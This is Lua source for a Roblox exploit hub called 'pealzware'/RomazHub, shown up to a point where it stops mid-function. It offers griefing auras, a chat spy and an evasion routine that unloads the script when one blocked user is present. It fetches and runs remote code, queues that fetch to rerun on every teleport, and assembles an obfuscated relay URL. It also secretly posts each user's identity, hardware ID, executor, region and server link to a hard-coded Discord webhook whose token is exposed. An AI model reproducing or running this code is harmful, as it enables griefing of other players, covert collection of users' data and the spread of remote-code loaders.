do
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    -- The ID you want to hide from seeing you use the script
    local BLOCKED_ID = 8615658150

    -- Exception list: these users will NOT trigger the unload
    local EXCEPTIONS = {
        9763171531, -- pealz
        10304502709, -- mental
        2581030028, -- valtiel
        10340049663, -- evilguy
    }

    local function isException(userId)
        for _, id in ipairs(EXCEPTIONS) do
            if id == userId then
                return true
            end
        end
        return false
    end

    local function isBlocked(player)
        if isException(player.UserId) then
            return false
        end
        return player.UserId == BLOCKED_ID and player ~= LocalPlayer
    end

    local function unloadScript()
        if getgenv().Library then
            pcall(function() 
                getgenv().Library:Unload() 
                print(":warning: Script unloaded: Blacklisted user detected.")
            end)
        end
    end

    -- Check everyone currently in the server
    for _, player in ipairs(Players:GetPlayers()) do
        if isBlocked(player) then 
            unloadScript() 
            return 
        end
    end

    -- Check for anyone who joins later
    Players.PlayerAdded:Connect(function(player)
        if isBlocked(player) then 
            unloadScript() 
        end
    end)
end

if getgenv().pealzwareCommandService and getgenv().pealzwareCommandService.stop then
    pcall(function()
        getgenv().pealzwareCommandService.stop(true)
    end)
    getgenv().pealzwareCommandService = nil
end

local function cleanupStaleRomazHubUi(oldLibrary)
    local CoreGui = game:GetService("CoreGui")
    local UserInputService = game:GetService("UserInputService")
    local staleGuiNames = {
        "PealzwareUI",
        "LibraryModal",
        "RHETBDisplay",
        "CToolDragSelect",
        "RotateAngleUi",
        "LinVelGui",
        "RotVelGui",
        "DecalToolGui",
        "EditorToolGui",
        "GiverToolGui",
        "MoveToolGui",
        "CloneToolGui"
    }

    pcall(function()
        if oldLibrary and oldLibrary.ScreenGui and oldLibrary.ScreenGui.Parent then
            oldLibrary.ScreenGui:Destroy()
        end
    end)

    pcall(function()
        if oldLibrary and type(oldLibrary._ManagedGuis) == "table" then
            for _, gui in ipairs(oldLibrary._ManagedGuis) do
                if gui and gui.Parent then
                    gui:Destroy()
                end
            end
        end
    end)

    pcall(function()
        if oldLibrary and type(oldLibrary._ToolPanels) == "table" then
            for _, panel in ipairs(oldLibrary._ToolPanels) do
                if panel and panel.gui and panel.gui.Parent then
                    panel.gui:Destroy()
                end
            end
        end
    end)

    for _, guiName in ipairs(staleGuiNames) do
        pcall(function()
            local gui = CoreGui:FindFirstChild(guiName)
            if gui and gui:IsA("ScreenGui") then
                gui:Destroy()
            end
        end)
    end

    pcall(function()
        UserInputService.MouseIconEnabled = true
    end)
end

if getgenv().Library then
    local oldLibrary = getgenv().Library
    pcall(function()
        if oldLibrary.Uninject then
            oldLibrary:Uninject()
        elseif oldLibrary.Unload then
            oldLibrary:Unload()
        end
    end)
    cleanupStaleRomazHubUi(oldLibrary)
    task.wait(0.1) 
    getgenv().Library = nil
end

_G.ROMAZDEV_HUB_LOADED = nil

if game.PlaceId ~= 11137575513 and game.PlaceId ~= 12943245078 and game.PlaceId ~= 12943247001 and game.PlaceId ~= 108097274488844 then
     return
end
 

local _jobId = tostring(game.JobId or "")
if _jobId ~= "" then
    joinURL = string.format(
        "[Join Server](https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s)",
        tostring(game.PlaceId),
        _jobId
    )
else
    joinURL = string.format(
        "[Join Server](https://www.roblox.com/games/%s)",
        tostring(game.PlaceId)
    )
end

function main()

-- Forward declarations for cross-section variables
local AnchorAura, AuraRange, AuraSpeed, AutoDrop, AutoPickup
local AutoRejoin, BlockAura, ChatSpyToggle, FlyEnabled, FlySpeed
local GriefAura, MuteBoomboxesToggle, RainbowAura, ShowCredits, SignAura
local ToxicAura, UnanchorAura, autoScanThread, clearPreview, createToolButton
local createToolLabel, createToolPanel, fakeTimeConn, fakeTimeWatchConn, fakeTimeDescConn, fakeTimeLabelConns, http, importJsonInput
local localplr, muteBoomboxesEnabled, previewActive, previewBuildCenter, previewOffset, previewRotation, sanitizename
local startPreview, stashPlatform
local antiAfkConnection, antiAfkEnabled, antiAfkWindowFocusConn, antiAfkPanel, antiAfkFocusThread, antiAfkUiThread

Players = game:GetService("Players")
TweenService = game:GetService("TweenService")
ReplicatedStorage = game:GetService("ReplicatedStorage")
TeleportService = game:GetService("TeleportService")
HttpService = game:GetService("HttpService")
RunService = game:GetService("RunService")
UserInputService = game:GetService("UserInputService")
TextChatService = game:GetService("TextChatService")
MarketplaceService = game:GetService("MarketplaceService")
CollectionService = game:GetService("CollectionService")
CoreGui = game:GetService("CoreGui")

boomboxNames = {
    ["SuperFlyGoldBoombox"] = true,
    ["BoomboxGearThree"] = true,
    ["DualGoldenSuperFlyBoombox"] = true,
    ["DubstepBoombox"] = true,
    ["BeatUpBoombox"] = true
}

selectedBoombox = nil
boomboxId = ""
bbsbox = Instance.new("SelectionBox")
bbsbox.Color3 = Color3.fromRGB(255, 0, 0)
bbsbox.LineThickness = -1
bbsbox.SurfaceColor3 = Color3.fromRGB(255, 0, 0)
bbsbox.SurfaceTransparency = 1
bbsbox.Transparency = 0
bbsbox.Parent = CoreGui

 function extractSoundId(sound)
    if not sound then return "None" end
    if sound.SoundId == nil or sound.SoundId == "" then
        return "None"
    else
         soundIdString = sound.SoundId
         idStart = string.find(soundIdString, "id=")
        if idStart then
            return string.sub(soundIdString, idStart + 3)
        else
             pattern = "%d+"
             extractedId = string.match(soundIdString, pattern)
            return extractedId or "None"
        end
    end
end

plr = Players.LocalPlayer
localplr = game.Players.LocalPlayer
mouse = plr:GetMouse()
tools = {}
scriptConnections = {}
local function trackScriptConnection(conn)
    if conn then
        table.insert(scriptConnections, conn)
    end
    return conn
end

local function disconnectConnectionList(connections)
    for i, conn in pairs(connections) do
        pcall(function()
            conn:Disconnect()
        end)
        connections[i] = nil
    end
end

isog = workspace:FindFirstChild("Cubes") ~= nil
if isog then
    cfolder = workspace:WaitForChild("Cubes")
else
    cfolder = workspace:WaitForChild("Bricks")
end
brickname = isog and "Cube" or "Brick"
playerGui = plr:WaitForChild("PlayerGui")
antiConnections = {}
OWNER_ID = {
    9763171531,
    8615658150,
    10340049663, -- Broo trust leave me here...
    1734966239, -- totally not soskoify (pls leave i wanna troll romaz kids)
    8294506025, -- totally not soskoify alt (pls still leave)
}

ROMAZHUB_PREMIUM_GAMEPASS_ID = 1635806447
_premiumCache = {}
local syncHubRoleBillboard
local refreshPremiumUi, setLocalPremiumState

isOwner = false
for _, _oid in ipairs(OWNER_ID) do
    if plr.UserId == _oid then isOwner = true; break end
end

isPremium = false
if not isOwner then
    task.spawn(function()
        local _initOk, _result = pcall(function()
            return game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, ROMAZHUB_PREMIUM_GAMEPASS_ID)
        end)
        if _initOk and _result then
            if setLocalPremiumState then
                setLocalPremiumState(true)
            else
                isPremium = true
                _premiumCache[plr.UserId] = true
                if refreshPremiumUi then
                    task.defer(refreshPremiumUi)
                end
                if syncHubRoleBillboard then
                    task.defer(syncHubRoleBillboard, plr)
                end
            end
        end
    end)
end

if _G.ROMAZDEV_HUB_LOADED then return end
_G.ROMAZDEV_HUB_LOADED = true

 AUTOURL = "https://raw.githubusercontent.com/1AreYouMental110/TCO/refs/heads/main/notes.lua"

function _queueAutoExec()
    local p = "pcall(function() if isfile and isfile('pealzwareCache/no_auto_exec.txt') then return end; loadstring(game:HttpGet('" .. AUTOURL .. "'))() end)"
    pcall(function()
        if syn and syn.queue_on_teleport then
            syn.queue_on_teleport(p)
        elseif queue_on_teleport then
            queue_on_teleport(p)
        elseif fluxus and fluxus.queue_on_teleport then
            fluxus.queue_on_teleport(p)
        end
    end)
end

_queueAutoExec()

pcall(function()
    plr.OnTeleport:Connect(function(state)
        if state == Enum.TeleportState.Started then
            _queueAutoExec()
        end
    end)
end)

Players = game:GetService("Players")
MarketplaceService = game:GetService("MarketplaceService")
HttpService = game:GetService("HttpService")
Stats = game:GetService("Stats")
UserInputService = game:GetService("UserInputService")
LocalizationService = game:GetService("LocalizationService")
RbxAnalyticsService = game:GetService("RbxAnalyticsService")

player = Players.LocalPlayer
sessionStart = tick()

 requestFunc =
    (syn and syn.request)
    or request
    or http_request
    or function() return { StatusCode = 0 } end

local _relayParts = {
    string.char(104,116,116,112,115,58,47,47),
    string.char(114,122,45,115,121,110,99,45,119,111,114,107,101,114),
    string.char(46),
    string.reverse("buhzamor"),
    string.char(46,119,111,114,107,101,114,115,46,100,101,118)
}
local _relayUrl = table.concat(_relayParts)
-- Backup relay: deploy websites-repo/relay-worker.js to Cloudflare Workers
-- then replace the empty string below with your worker URL
local _relayBackupUrl = "https://rz-sync.pealz1.deno.net"
local _buildServerUrl = "https://pealz.tail5e911b.ts.net"


 function getExecutor()
    if syn and syn.request then return "Synapse X" end
    if fluxus and fluxus.request then return "Fluxus" end
    if KRNL_LOADED or Krnl then return "KRNL" end
    if getexecutorname then return getexecutorname() end
    return "Unknown"
end

 function getHWID()
    if get_hwid then return tostring(get_hwid()) end
     ok, id = pcall(function()
        return RbxAnalyticsService:GetClientId()
    end)
    return ok and id or "Unknown"
end

 function getPing()
     ok, v = pcall(function()
        return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
    end)
    return ok and math.floor(v) or 0
end

 function getFPS()
     fps = workspace:GetRealPhysicsFPS()
    return fps > 0 and math.floor(fps) or 0
end

 function getServerType()
     map = {
        [11137575513] = "Normal",
        [12943245078] = "XL",
        [12943247001] = "VC"
    }
    return map[game.PlaceId] or "Unknown"
end

 function getRegion()
     ok, region = pcall(function()
        return LocalizationService.RobloxLocaleId
    end)
    return ok and region or "Unknown"
end

webhookUrl = "https://discord.com/api/webhooks/1482875550078075103/fzjhWBHBlRpzaI1PZO3ff2UVBu35GxCGn9DfL48RvS5Oy7ZAP7pv1eY8OMo4T-2TtXcp"
productInfo = nil
local function getPlaceProductInfo()
    if type(productInfo) == "table" and productInfo.Name then
        return productInfo
    end
    local ok, info = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    if ok and type(info) == "table" then
        productInfo = info
        return info
    end
    return {Name = "Unknown"}
end

local function getPlaceProductName()
    local info = getPlaceProductInfo()
    return tostring((type(info) == "table" and info.Name) or "Unknown")
end

local _cachedTextChannels = nil
local _cachedGeneralTextChannel = nil

local function getTextChannels()
    if _cachedTextChannels and _cachedTextChannels.Parent then
        return _cachedTextChannels
    end
    local tcs = TextChatService
    if not tcs then
        local ok, svc = pcall(function()
            return game:GetService("TextChatService")
        end)
        if not ok then return nil end
        TextChatService = svc
        tcs = svc
    end
    if tcs.TextChannels then
        _cachedTextChannels = tcs.TextChannels
        return _cachedTextChannels
    end
    local ok, channels = pcall(function()
        return tcs:WaitForChild("TextChannels", 5)
    end)
    if ok then
        _cachedTextChannels = channels
        return _cachedTextChannels
    end
    return nil
end

local function getGeneralTextChannel()
    if _cachedGeneralTextChannel and _cachedGeneralTextChannel.Parent then
        return _cachedGeneralTextChannel
    end
    local channels = getTextChannels()
    if not channels then return nil end
    local general = channels:FindFirstChild("RBXGeneral")
    if general then
        _cachedGeneralTextChannel = general
        return _cachedGeneralTextChannel
    end
    local ok, waited = pcall(function()
        return channels:WaitForChild("RBXGeneral", 5)
    end)
    if ok then
        _cachedGeneralTextChannel = waited
        return _cachedGeneralTextChannel
    end
    return nil
end

local function sendGeneralChatMessage(message)
    if message == nil then return false end
    local payload = tostring(message)
    local general = getGeneralTextChannel()
    if general then
        local ok = pcall(function()
            general:SendAsync(payload)
        end)
        if ok then
            return true
        end
    end
    return pcall(function()
        local legacyChat = ReplicatedStorage and ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        local legacySignal = legacyChat and legacyChat:FindFirstChild("SayMessageRequest")
        if not legacySignal then
            error("general chat unavailable")
        end
        legacySignal:FireServer(payload, "All")
    end)
end

local function displayGeneralSystemMessage(message)
    local general = getGeneralTextChannel()
    if not general then
        return false
    end
    return pcall(function()
        general:DisplaySystemMessage(tostring(message or ""))
    end)
end

task.spawn(function()
    productInfo = getPlaceProductInfo()

    local info = {
        username = player.Name,
        displayName = player.DisplayName,
        userId = player.UserId,
        accountAge = player.AccountAge,
        accountCreationDate = os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)),
        gameName = getPlaceProductName(),
        placeId = game.PlaceId,
        jobId = game.JobId,
        serverType = getServerType(),
        playerCount = #Players:GetPlayers(),
        maxPlayers = Players.MaxPlayers,
        ping = getPing(),
        fps = getFPS(),
        executor = getExecutor(),
        hwid = getHWID(),
        platform = UserInputService:GetPlatform().Name,
        region = getRegion(),
        time = os.date("%Y-%m-%d %H:%M:%S"),
        timezone = os.date("%Z"),
        sessionDuration = math.floor(tick() - sessionStart)
    }

    local _hasEnlighten = (plr.Backpack and plr.Backpack:FindFirstChild("The Arkenstone")) ~= nil
        or (plr.Character and plr.Character:FindFirstChild("The Arkenstone")) ~= nil
    local _isAdmin = pcall(function()
        return plr.Team and plr.Team.Name == "Chosen"
    end) and (plr.Team ~= nil and plr.Team.Name == "Chosen") or false

    local embed = {
        title = "Script Executed",
        color = 0x2ECC71,
        description = joinURL,
        thumbnail = {
            url = string.format(
                "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
                info.userId
            )
        },
        fields = {
            {
                name = "👤 Player",
                value = string.format(
                    "**%s** (`%s`)\nID: `%d` | Age: %d days | Joined: %s%s%s",
                    info.displayName,
                    info.username,
                    info.userId,
                    info.accountAge,
                    info.accountCreationDate,
                    _hasEnlighten and "\n✨ Enlightened" or "",
                    _isAdmin and "\n👑 Admin" or ""
                ),
                inline = true
            },
            {
                name = "🎮 Server",
                value = string.format(
                    "**%s** — %s\n%d/%d players | Place `%d`\nJob ID: `%s`",
                    info.gameName,
                    info.serverType,
                    info.playerCount,
                    info.maxPlayers,
                    info.placeId,
                    _jobId ~= "" and _jobId or "unknown"
                ),
                inline = true
            },
            {
                name = "⚙️ Client",
                value = string.format(
                    "**Executor:** %s\n**HWID:** `%s`\n**Platform:** %s | **Region:** %s\n**Ping:** %d ms | **FPS:** %d",
                    info.executor,
                    info.hwid,
                    info.platform,
                    info.region,
                    info.ping,
                    info.fps
                ),
                inline = false
            }
        },
        footer = { text = "pealzware" },
        timestamp = DateTime.now():ToIsoDate()
    }

    local webhookData = { embeds = { embed } }

    pcall(function()
        requestFunc({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(webhookData)
        })
    end)
end)

 function sendPaintActionWebhook(data)
     webhookData = {
        embeds = {{
            title = "🎨 Paint Action",
            description = joinURL,
            color = 0x9B59B6,
            fields = {
                {
                    name = "👤 Player",
                    value = string.format(
                        "**%s** (`%s`) | ID: `%d`",
                        data.username,
                        data.username,
                        data.userId
                    ),
                    inline = true
                },
                {
                    name = "🎮 Server",
                    value = string.format(
                        "%s — %s | %d players",
                        data.gameName,
                        data.serverType,
                        #Players:GetPlayers()
                    ),
                    inline = true
                },
                {
                    name = "✏️ Paint",
                    value = string.format(
                        "**Mode:** %s | **Color:** %s | **Side:** %s\n**Text:** `%s`",
                        data.mode,
                        data.color,
                        data.side,
                        data.text ~= "" and data.text or "(none)"
                    ),
                    inline = false
                }
            },
            thumbnail = {
                url = string.format(
                    "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
                    data.userId
                )
            },
            footer = { text = "pealzware" },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
    pcall(function()
        requestFunc({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode(webhookData)
        })
    end)
end

function sendActionWebhook(action, description)
     _plr = game.Players.LocalPlayer
     _prod = getPlaceProductInfo()
     webhookData = {
        embeds = {{
            title = "⚡ " .. action,
            description = joinURL,
            color = 0xE67E22,
            thumbnail = {
                url = string.format(
                    "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
                    _plr.UserId
                )
            },
            fields = {
                {
                    name = "📋 Details",
                    value = description,
                    inline = false
                },
                {
                    name = "👤 Player",
                    value = string.format(
                        "**%s** (`%s`) | ID: `%d` | Age: %d days",
                        _plr.DisplayName,
                        _plr.Name,
                        _plr.UserId,
                        _plr.AccountAge
                    ),
                    inline = true
                },
                {
                    name = "🎮 Server",
                    value = string.format(
                        "%s — %s | %d/%d | %d ms",
                        getPlaceProductName(),
                        getServerType(),
                        #Players:GetPlayers(),
                        Players.MaxPlayers,
                        getPing()
                    ),
                    inline = true
                }
            },
            footer = { text = "pealzware" },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
    
    pcall(function()
        requestFunc({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(webhookData)
        })
    end)
end

local pealzwareRepo = 'https://raw.githubusercontent.com/1AreYouMental110/pealzware/main/'
local _pload = (shared and shared.pload) or getgenv().pload
if type(_pload) == "function" then
    local ok, lib = pcall(function()
        return _pload('gui/modern.lua', true, true)
    end)
    if ok and lib then
        Library = lib
    end
end
if not Library then
    Library = loadstring(game:HttpGet(pealzwareRepo .. 'gui/modern.lua', true))()
end

-- ── Destroy BedWars/Legit categories pre-created by modern.lua ────────────
-- modern.lua executes CreateCategory calls (Combat, Blatant, Render, etc.)
-- at the TOP LEVEL before returning mainapi, so they always appear in the
-- sidebar first.  We destroy them immediately so only TCO tabs show up.
do
    local _bwPreCats = {
        'Combat','Blatant','Render','Utility','World','Misc','Inventory','Minigames',
        'Friends','Profiles','Targets'
    }
    for _, _n in ipairs(_bwPreCats) do
        local _c = Library.Categories[_n]
        if _c then
            pcall(function() if _c.Object    then _c.Object:Destroy()          end end)
            pcall(function() if _c.Button and _c.Button.Object then _c.Button.Object:Destroy() end end)
            Library.Categories[_n] = nil
        end
    end
    -- Clear pre-registered BW modules so search index starts fresh for TCO modules
    Library.Modules = {}
    -- Remove orphaned BW-era dividers that were added to the main nav sidebar
    pcall(function()
        local mainCat = Library.Categories.Main
        if not mainCat or not mainCat.Object then return end
        local navChildren = mainCat.Object:FindFirstChild('Children')
        if navChildren then
            for _, child in ipairs(navChildren:GetChildren()) do
                if child.Name == 'Divider' or child.Name == 'DividerLabel' then
                    child:Destroy()
                end
            end
        end
    end)
end

-- ═══════════════════════════════════════════════════════════════════
-- Compatibility shim: bridge the pealzware modern.lua API surface to
-- the PealzwareUI calls that the rest of RomazHub.lua expects.
-- modern.lua already ran CreateGUI() during module init so the nav
-- sidebar, ScaledGui, and ClickGui are all available immediately.
-- ═══════════════════════════════════════════════════════════════════
do
    local _libs = Library.Libraries
    local _pal  = _libs.uipallet   -- {Main, Text, Font, FontSemiBold}
    local _col  = _libs.color      -- {.Dark(col,n), .Light(col,n)}

    -- Derive accent colour from the live GUIColor slider (0-1 HSV)
    local _ah, _as, _av = 0.46, 0.96, 0.52
    pcall(function()
        local gc = Library.GUIColor
        if gc and gc.Hue then _ah = gc.Hue; _as = gc.Sat; _av = gc.Value end
    end)
    local _accent = Color3.fromHSV(_ah, _as, _av)

    -- ── Palette ───────────────────────────────────────────────────
    Library.Palette = {
        Main            = _pal.Main,
        Text            = _pal.Text,
        Font            = _pal.Font,
        FontSemiBold    = _pal.FontSemiBold or _pal.Font,
        AccentColor     = _accent,
        OutlineColor    = _col.Dark(_pal.Main, 0.15),
        BackgroundColor = _col.Dark(_pal.Main, 0.05),
    }
    Library.FontColor       = Library.Palette.Text
    Library.BackgroundColor = Library.Palette.BackgroundColor  -- shortcut used in card builders
    Library.OutlineColor    = Library.Palette.OutlineColor     -- shortcut used in card stroke

    -- ── Colour helpers ────────────────────────────────────────────
    Library.Color = _col

    -- ── GUI pointers (created top-level in modern.lua before return)
    Library.ScaledGui = Library.gui and Library.gui:FindFirstChild('ScaledGui')
    Library.ClickGui  = Library.ScaledGui and Library.ScaledGui:FindFirstChild('ClickGui')

    -- ── Utility ───────────────────────────────────────────────────
    Library.Utility = {
        AddCorner = function(inst, radius)
            local c = Instance.new('UICorner')
            c.CornerRadius = radius or UDim.new(0, 6)
            c.Parent = inst; return c
        end,
        AddBlur    = function() end,
        MakeDraggable = function(frame)
            local uis = game:GetService('UserInputService')
            local dragging, dragInput, dragStart, startPos
            frame.InputBegan:Connect(function(inp)
                if inp.UserInputType == Enum.UserInputType.MouseButton1
                or inp.UserInputType == Enum.UserInputType.Touch then
                    dragging = true; dragStart = inp.Position; startPos = frame.Position
                    inp.Changed:Connect(function()
                        if inp.UserInputState == Enum.UserInputState.End then dragging = false end
                    end)
                end
            end)
            frame.InputChanged:Connect(function(inp)
                if inp.UserInputType == Enum.UserInputType.MouseMovement
                or inp.UserInputType == Enum.UserInputType.Touch then dragInput = inp end
            end)
            uis.InputChanged:Connect(function(inp)
                if inp == dragInput and dragging then
                    local d = inp.Position - dragStart
                    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X,
                                               startPos.Y.Scale, startPos.Y.Offset + d.Y)
                end
            end)
        end,
    }

    -- ── Asset resolution ──────────────────────────────────────────
    -- modern.lua exposes its dict-based getcustomasset (rbxassetid:// URLs)
    -- via Library.Libraries.getcustomasset. Use that as primary source so
    -- icons work even when executor local files aren't present.
    Library.Assets = {
        Get = function(name)
            local n = tostring(name or '')
            local path = 'pealzware/assets/new/'..n..'.png'
            -- Primary: modern.lua's bundled asset dict (always works, no local files needed)
            local libGet = Library.Libraries and Library.Libraries.getcustomasset
            if type(libGet) == 'function' then
                local ok, res = pcall(libGet, path)
                if ok and res and res ~= '' then return res end
            end
            -- Fallback: executor getcustomasset (works when files are on disk)
            local ok, res = pcall(getcustomasset, path)
            if ok and res and res ~= '' then return res end
            return 'rbxassetid://0'
        end
    }

    -- ── Bookkeeping ───────────────────────────────────────────────
    Library.Controls = {}
    Library.Registry = { _e = {}, Add = function(self, inst, props)
        if inst then self._e[inst] = props end
    end }
    Library.Name  = 'pealzware'
    Library.Scale = Library.Scale or { Scale = 1 }

    -- ── Manager stubs ─────────────────────────────────────────────
    Library.SaveManager = {
        SetLibrary                 = function() end,
        IgnoreThemeSettings        = function() end,
        SetIgnoreIndexes           = function() end,
        SetIgnoreSettingsPredicate = function() end,
        BuildConfigSection         = function() return {} end,
        LoadAutoloadConfig         = function() end,
        SetFolder                  = function() end,
    }
    Library.ThemeManager = {
        SetLibrary        = function() end,
        SetFolder         = function() end,
        ApplyTheme        = function() end,
        ApplyToTab        = function() end,
        BuildThemeSection = function() return {} end,
    }

    -- ── Notify (accepts both (msg,time) and (title,msg,time,kind)) ─
    function Library:Notify(title, msg, dur, kind)
        pcall(function()
            self:CreateNotification(
                tostring(title or self.Name or 'pealzware'),
                tostring(msg or ''),
                tonumber(dur) or 4, kind)
        end)
    end

    function Library:GiveSignal(conn)
        pcall(function() self:Clean(conn) end)
    end

    function Library:SetWatermark() end
    function Library:SetWatermarkVisibility() end
    function Library:SetWatermarkPosition() end

    function Library:CreateHomeTab() return {} end

    function Library:CreateToggleButton(opts)
        opts = opts or {}
        local _btn = Instance.new('TextButton')
        _btn.Size = UDim2.fromOffset(70, 24); _btn.Position = UDim2.fromOffset(8, 8)
        _btn.BackgroundColor3 = Library.Palette.AccentColor
        _btn.Text = opts.Text or 'Menu'; _btn.TextColor3 = Library.Palette.Text
        _btn.TextSize = 11; _btn.FontFace = Library.Palette.Font; _btn.ZIndex = 10
        Library.Utility.AddCorner(_btn, UDim.new(0, 5))
        -- Accent glow border on the main menu toggle
        local _mStroke = Instance.new('UIStroke')
        _mStroke.Color = Library.Palette.AccentColor
        _mStroke.Thickness = 1
        _mStroke.Transparency = 0.4
        _mStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        _mStroke.Parent = _btn
        local _tsMb = game:GetService('TweenService')
        local _sg = Library.ScaledGui
        if _sg then _btn.Parent = _sg
        else task.defer(function() if Library.ScaledGui then _btn.Parent = Library.ScaledGui end end) end
        _btn.MouseEnter:Connect(function()
            _tsMb:Create(_btn, TweenInfo.new(0.1), { BackgroundTransparency = 0.18 }):Play()
        end)
        _btn.MouseLeave:Connect(function()
            _tsMb:Create(_btn, TweenInfo.new(0.1), { BackgroundTransparency = 0 }):Play()
        end)
        _btn.MouseButton1Down:Connect(function()
            _tsMb:Create(_btn, TweenInfo.new(0.05), { BackgroundTransparency = 0.4 }):Play()
        end)
        _btn.MouseButton1Up:Connect(function()
            _tsMb:Create(_btn, TweenInfo.new(0.1), { BackgroundTransparency = 0 }):Play()
        end)
        _btn.MouseButton1Click:Connect(function()
            local cg = Library.ClickGui; if cg then cg.Visible = not cg.Visible end
        end)
        return _btn
    end

    -- CreateGUI: nav was already built during module init; skip recreate
    function Library:CreateGUI() end

    -- CreateAlert base (line ~1408 wraps this)
    function Library:CreateAlert(textOrOpts, dur, kind)
        local _text  = type(textOrOpts) == 'table' and (textOrOpts.Text or '')  or tostring(textOrOpts or '')
        local _title = type(textOrOpts) == 'table' and (textOrOpts.Title or self.Name) or (self.Name or 'Alert')
        self:Notify(_title, _text, tonumber(dur) or 6, kind)
    end

    -- ── UI sound feedback ─────────────────────────────────────────────────
    -- Subtle click/pop sounds for every toggle, button, and dropdown.
    -- Sounds are lazy-cached so the first interaction creates them once.
    local _uiSounds   = {}
    local _uiSoundIds = {
        Toggle   = 'rbxassetid://9119713951',  -- soft pop
        Button   = 'rbxassetid://6026984224',  -- click
        Dropdown = 'rbxassetid://6026984224',
    }
    local _svcSnd
    pcall(function() _svcSnd = game:GetService('SoundService') end)
    local function _playUiSound(nm)
        pcall(function()
            local id = _uiSoundIds[nm]
            if not id then return end
            local s = _uiSounds[id]
            if not s or not s.Parent then
                local ok, inst = pcall(Instance.new, 'Sound')
                if not ok or not inst then return end
                s = inst
                s.SoundId = id
                s.Volume  = 0.22
                s.RollOffMaxDistance = 0
                pcall(function() s.Parent = _svcSnd or workspace end)
                _uiSounds[id] = s
            end
            pcall(function() s:Play() end)
        end)
    end
    Library._playUiSound = _playUiSound   -- expose for raw button helpers below

    -- ── Tween shorthand ───────────────────────────────────────────────────
    local _ts = game:GetService('TweenService')
    local function _tw(inst, t, props, style, dir)
        if not inst then return end
        pcall(function()
            _ts:Create(inst,
                TweenInfo.new(t or 0.15,
                    style or Enum.EasingStyle.Quart,
                    dir   or Enum.EasingDirection.Out),
                props):Play()
        end)
    end
    Library._tw = _tw   -- expose for CreatePopout/createToolButton below

    -- ── OnChanged helper ──────────────────────────────────────────────────
    -- modern.lua calls optionsettings.Function by TABLE LOOKUP at fire-time
    -- (not closure capture), so replacing opts.Function after creation
    -- chains callbacks correctly.  This bridges the RomazHub OnChanged API.
    local function _addOnChanged(ctrl, opts)
        if not ctrl or type(ctrl) ~= 'table' or ctrl.OnChanged then return ctrl end
        function ctrl:OnChanged(fn)
            if not opts then return self end
            local _prev = opts.Function
            if type(_prev) ~= 'function' then _prev = function() end end
            opts.Function = function(...)
                pcall(_prev, ...)
                pcall(fn, ...)
            end
            return self
        end
        return ctrl
    end

    -- ── CreateCategory: use modern.lua's real implementation (Apple-style
    --    toggles, interactive sliders, animated dropdowns, etc.).
    --    We inject: sound feedback, OnChanged shim, Refresh alias.
    local function _normalizeLegacyControlOptions(kind, opts)
        if type(opts) ~= 'table' then
            if kind == 'Label' and opts ~= nil then
                return { Text = tostring(opts) }
            end
            return opts or {}
        end

        if opts.Name == nil and opts.Text ~= nil and kind ~= 'Label' then
            opts.Name = opts.Text
        end
        if opts.Function == nil then
            opts.Function = opts.Callback or opts.Func
        end

        if kind == 'Dropdown' then
            if opts.List == nil then
                opts.List = opts.Options or opts.Values or {}
            end
            if type(opts.List) ~= 'table' then
                opts.List = {}
            end
            if type(opts.Default) == 'number' and opts.List[opts.Default] ~= nil then
                opts.Default = opts.List[opts.Default]
            elseif opts.Default == nil and opts.Value ~= nil then
                opts.Default = opts.Value
            end
        elseif kind == 'TextBox' then
            if opts.Placeholder == nil and opts.PlaceholderText ~= nil then
                opts.Placeholder = opts.PlaceholderText
            end
            if opts.Default == nil and opts.Value ~= nil then
                opts.Default = opts.Value
            end
        elseif kind == 'Label' then
            opts.Text = opts.Text or opts.Name or ''
        end

        return opts
    end

    local _modCat = Library.CreateCategory
    function Library:CreateCategory(s)
        s = s or {}
        local cat = _modCat(self, s)
        if not cat then return nil end
        local _origCM = cat.CreateModule
        if type(_origCM) == 'function' then
            cat.CreateModule = function(self2, ms)
                local mod = _origCM(self2, ms)
                if not mod then return nil end
                local _patch = {'Toggle','Slider','Dropdown','TextBox','Button','Label','ColorSlider','TwoSlider'}
                for _, nm in ipairs(_patch) do
                    local _origFn = mod['Create'..nm]
                    if type(_origFn) == 'function' then
                        mod['Create'..nm] = function(self3, opts)
                            opts = _normalizeLegacyControlOptions(nm, opts)
                            -- Create the component first so modern.lua's init
                            -- (including any Dropdown default-value call) runs
                            -- WITHOUT the sound wrapper, avoiding premature firing.
                            local ctrl = _origFn(self3, opts)
                            if ctrl then
                                -- Wire sound AFTER creation via opts.Function replacement.
                                -- modern.lua reads opts.Function at fire-time (table lookup),
                                -- so this post-creation replacement is safe and effective.
                                if opts and _uiSoundIds[nm] then
                                    local _userFn = opts.Function
                                    opts.Function = function(...)
                                        pcall(_playUiSound, nm)
                                        if type(_userFn) == 'function' then
                                            pcall(_userFn, ...)
                                        end
                                    end
                                end
                                _addOnChanged(ctrl, opts)
                                -- :Refresh() alias — modern.lua uses :Change(), script uses :Refresh()
                                if nm == 'Dropdown' and ctrl.Change and not ctrl.Refresh then
                                    ctrl.Refresh = ctrl.Change
                                end
                                -- Toggle: expose .Value (= .Enabled) and :SetValue(bool)
                                -- so scripts can read toggle state without using .Enabled.
                                if nm == 'Toggle' then
                                    ctrl.Value = ctrl.Enabled or false
                                    if not ctrl.SetValue then
                                        function ctrl:SetValue(v)
